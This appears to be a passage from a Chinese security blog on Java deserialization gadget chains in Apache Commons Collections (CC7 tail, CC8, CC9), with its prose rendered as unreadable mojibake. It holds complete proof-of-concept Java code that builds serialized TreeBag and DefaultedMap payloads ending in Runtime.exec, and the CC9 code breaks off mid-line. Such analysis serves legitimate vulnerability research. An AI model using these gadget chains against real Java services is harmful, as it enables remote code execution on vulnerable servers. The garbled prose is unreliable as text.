<p>Á¨¨‰∏ÄÊ¨°Ê∑ªÂä†ÂÖÉÁ¥†Êó∂ÔºåÊòæÁÑ∂ for ‰∏≠ÁöÑ if ÊòØ‰∏çÊª°Ë∂≥ÁöÑÔºåÂõ†Ê≠§Ë¶ÅÊ∑ªÂä†‰∏§Ê¨°ÔºåÂÄº‰∏∫<code>yy zZ</code>ÔºåÂõ†‰∏∫<code>e.hash==hash</code>ÊòØ hashCode ÁÆóÊ≥ïÂØºËá¥ÁöÑ hash ÂÜ≤Á™Å</p>
<p>Á¨¨‰∏â‰∏™Ôºå<code>decorate</code>Â∞ÅË£ÖÁöÑ innermap ‰∏çËÉΩÊòØÂêå‰∏Ä‰∏™<code>HashMap</code></p>
<p>Á¨¨Âõõ‰∏™ÔºåÊúÄÂêéËøòË¶ÅÁßªÈô§ map2 ÁöÑ yy ÈîÆ</p>
<p>Âú®Ê≤°ÊúâÁßªÈô§Ëøô‰∏™ÈîÆÁöÑÊó∂ÂÄôË∞ÉËØïÂèëÁé∞Á°ÆÂÆû map2 Â§öÂá∫Êù•‰∫ÜËøô‰∏™ÈîÆ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png" srcset="/img/loading.gif" lazyload></p>
<p>ÂâçÈù¢ÊèêÂà∞ËøáÔºå<code>LazyMap</code>ÁöÑ<code>map</code>Â±ûÊÄß‰∏∫<code>HashMap</code>ÂØπË±°Êó∂ÔºåÂÖ∂Êñ∞Â¢ûÁöÑÂÖÉÁ¥†ÊòØÂ≠òÂÇ®Âú®<code>HashMap.Node</code>ÂÜÖÈÉ®Á±ª‰∏≠ÁöÑÔºåËÄåÊàë‰ª¨Âêë<code>LazyMap</code>put ‰∫Ü‰∏ÄÁªÑ hash ÂÜ≤Á™ÅÁöÑÈîÆ(Ëøô‰∏™‰∏§‰∏™ÈîÆÁÑ∂ÂêéÂ≠òÂÇ®Âú®<code>HashMap.Node</code>)ÔºåËøôÂ∞±Ê∂âÂèäÂà∞‰∫Ü<code>HashMap</code>Â¶Ç‰ΩïÂ§ÑÁêÜ hash ÂÜ≤Á™ÅÁöÑ‰∫Ü</p>
<p>Êàë‰ª¨Áúã‰∏Ä‰∏ã<code>LazyMap.put-&gt;HashMap.put</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (table == EMPTY_TABLE) &#123;<br>        inflateTable(threshold);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-keyword">int</span> hash = hash(key);<br>    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            V oldValue = e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-keyword">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br><br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addEntry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hash, K key, V value, <span class="hljs-keyword">int</span> bucketIndex)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="hljs-keyword">null</span> != table[bucketIndex])) &#123;<br>        resize(<span class="hljs-number">2</span> * table.length);<br>        hash = (<span class="hljs-keyword">null</span> != key) ? hash(key) : <span class="hljs-number">0</span>;<br>        bucketIndex = indexFor(hash, table.length);<br>    &#125;<br><br>    createEntry(hash, key, value, bucketIndex);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáåÂèØÁü•ÊòØÈÄöËøáÂçïÂêëÈìæË°®Ëß£ÂÜ≥ÁöÑ</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_72753070/article/details/126120740">https://blog.csdn.net/weixin_72753070/article/details/126120740</a></p>
<p>ÁâàÊú¨Â∫îËØ•‰∏ç‰∏ÄÊ†∑Ôºå‰∫ÜËß£Âç≥ÂèØ</p>
<p>Á≥ªÁªüÊÄªÊòØÂ∞ÜÊñ∞Ê∑ªÂä†ÁöÑ Entry ÂØπË±°ÊîæÂÖ• table Êï∞ÁªÑÁöÑ bucketIndex Á¥¢ÂºïÂ§Ñ‚Äî‚ÄîÂ¶ÇÊûú bucketIndex Á¥¢ÂºïÂ§ÑÂ∑≤ÁªèÊúâ‰∫Ü‰∏Ä‰∏™ Entry ÂØπË±°ÔºåÈÇ£Êñ∞Ê∑ªÂä†ÁöÑ Entry ÂØπË±°ÊåáÂêëÂéüÊúâÁöÑ Entry ÂØπË±°Ôºà‰∫ßÁîü‰∏Ä‰∏™ Entry ÈìæÔºâÔºåÂ¶ÇÊûú bucketIndex Á¥¢ÂºïÂ§ÑÊ≤°Êúâ Entry ÂØπË±°Ôºå‰πüÂ∞±ÊòØ‰∏äÈù¢Á®ãÂ∫è‰ª£Á†ÅÁöÑ e ÂèòÈáèÊòØ nullÔºå‰πüÂ∞±ÊòØÊñ∞ÊîæÂÖ•ÁöÑ Entry ÂØπË±°ÊåáÂêë nullÔºå‰πüÂ∞±ÊòØÊ≤°Êúâ‰∫ßÁîü Entry Èìæ</p>
<p>HashMap ÈáåÈù¢Ê≤°ÊúâÂá∫Áé∞ hash ÂÜ≤Á™ÅÊó∂ÔºåÊ≤°ÊúâÂΩ¢ÊàêÂçïÈìæË°®Êó∂Ôºåhashmap Êü•ÊâæÂÖÉÁ¥†ÂæàÂø´,get()ÊñπÊ≥ïËÉΩÂ§üÁõ¥Êé•ÂÆö‰ΩçÂà∞ÂÖÉÁ¥†Ôºå‰ΩÜÊòØÂá∫Áé∞ÂçïÈìæË°®ÂêéÔºåÂçï‰∏™ bucket ÈáåÂ≠òÂÇ®ÁöÑ‰∏çÊòØ‰∏Ä‰∏™ EntryÔºåËÄåÊòØ‰∏Ä‰∏™ Entry ÈìæÔºåÁ≥ªÁªüÂè™ËÉΩÂøÖÈ°ªÊåâÈ°∫Â∫èÈÅçÂéÜÊØè‰∏™ EntryÔºåÁõ¥Âà∞ÊâæÂà∞ÊÉ≥ÊêúÁ¥¢ÁöÑ Entry ‰∏∫Ê≠¢‚Äî‚ÄîÂ¶ÇÊûúÊÅ∞Â•ΩË¶ÅÊêúÁ¥¢ÁöÑ Entry ‰Ωç‰∫éËØ• Entry ÈìæÁöÑÊúÄÊú´Á´ØÔºàËØ• Entry ÊòØÊúÄÊó©ÊîæÂÖ•ËØ• bucket ‰∏≠ÔºâÔºåÈÇ£Á≥ªÁªüÂøÖÈ°ªÂæ™ÁéØÂà∞ÊúÄÂêéÊâçËÉΩÊâæÂà∞ËØ•ÂÖÉÁ¥†</p>
<p>ÂΩìÂàõÂª∫ HashMap Êó∂ÔºåÊúâ‰∏Ä‰∏™ÈªòËÆ§ÁöÑË¥üËΩΩÂõ†Â≠êÔºàload factorÔºâÔºåÂÖ∂ÈªòËÆ§ÂÄº‰∏∫ 0.75ÔºåËøôÊòØÊó∂Èó¥ÂíåÁ©∫Èó¥ÊàêÊú¨‰∏ä‰∏ÄÁßçÊäòË°∑ÔºöÂ¢ûÂ§ßË¥üËΩΩÂõ†Â≠êÂèØ‰ª•ÂáèÂ∞ë Hash Ë°®ÔºàÂ∞±ÊòØÈÇ£‰∏™ Entry Êï∞ÁªÑÔºâÊâÄÂç†Áî®ÁöÑÂÜÖÂ≠òÁ©∫Èó¥Ôºå‰ΩÜ‰ºöÂ¢ûÂä†Êü•ËØ¢Êï∞ÊçÆÁöÑÊó∂Èó¥ÂºÄÈîÄÔºåËÄåÊü•ËØ¢ÊòØÊúÄÈ¢ëÁπÅÁöÑÁöÑÊìç‰ΩúÔºàHashMap ÁöÑ get() ‰∏é put() ÊñπÊ≥ïÈÉΩË¶ÅÁî®Âà∞Êü•ËØ¢ÔºâÔºõÂáèÂ∞èË¥üËΩΩÂõ†Â≠ê‰ºöÊèêÈ´òÊï∞ÊçÆÊü•ËØ¢ÁöÑÊÄßËÉΩÔºå‰ΩÜ‰ºöÂ¢ûÂä† Hash Ë°®ÊâÄÂç†Áî®ÁöÑÂÜÖÂ≠òÁ©∫Èó¥</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190468">https://www.anquanke.com/post/id/190468</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190472">https://www.anquanke.com/post/id/190472</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p>
<h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><h3 id="Pre-7"><a href="#Pre-7" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-7"><a href="#ÈôêÂà∂-7" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 4.0</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-7"><a href="#Âà©Áî®Èìæ-7" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.TreeBag</span><span class="hljs-selector-class">.readObject</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.AbstractMapBag</span><span class="hljs-selector-class">.doReadObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.put</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><span class="hljs-selector-class">.TransformingComparator</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.newTransformer</span><br>    ... (TemplatesImpl gadget)<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-7"><a href="#ÂÖ≥ÈîÆÁ±ª-7" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TreeBag</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">TransformingComparator</span><br><span class="hljs-attribute">InvokerTransformer</span><br></code></pre></td></tr></table></figure>

<p>‰∏é CC2„ÄÅCC4 ÁöÑÂå∫Âà´Âú®‰∫é‰ΩøÁî®‰∫ÜÊñ∞ÁöÑËß¶ÂèëÁÇπ TreeBag</p>
<h3 id="Gadget-7"><a href="#Gadget-7" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC8;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.bag.TreeBag;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);<br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(templatesimpl);<br>        setFieldValue(invokerTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(treeBag);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><h3 id="Pre-8"><a href="#Pre-8" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-8"><a href="#ÈôêÂà∂-8" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1-3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-8"><a href="#Âà©Áî®Èìæ-8" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> <span class="hljs-comment">//??BadAttributeValueExpException</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-comment">//?? BadAttributeValueExpException</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DefaultedMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-8"><a href="#ÂÖ≥ÈîÆÁ±ª-8" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DefaultedMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br></code></pre></td></tr></table></figure>

<p>Ê¢ÖÂ≠êÈÖíÂ∏àÂÇÖÊèê‰∫§ÁöÑ CommonsCollections9Ôºå‰∏ªË¶ÅÂà©Áî®ÁöÑÊòØ CommonsCollections:3.2 ÁâàÊú¨Êñ∞Â¢ûÁöÑ DefaultedMap Êù•‰ª£Êõø LazyMapÔºåÂõ†‰∏∫Ëøô‰∏§‰∏™ Map ÊúâÂêåÊ†∑ÁöÑ get ÂáΩÊï∞ÂèØ‰ª•Ë¢´Âà©Áî®</p>
<h3 id="Gadget-8"><a href="#Gadget-8" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC9;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = DefaultedMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(fakechainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span 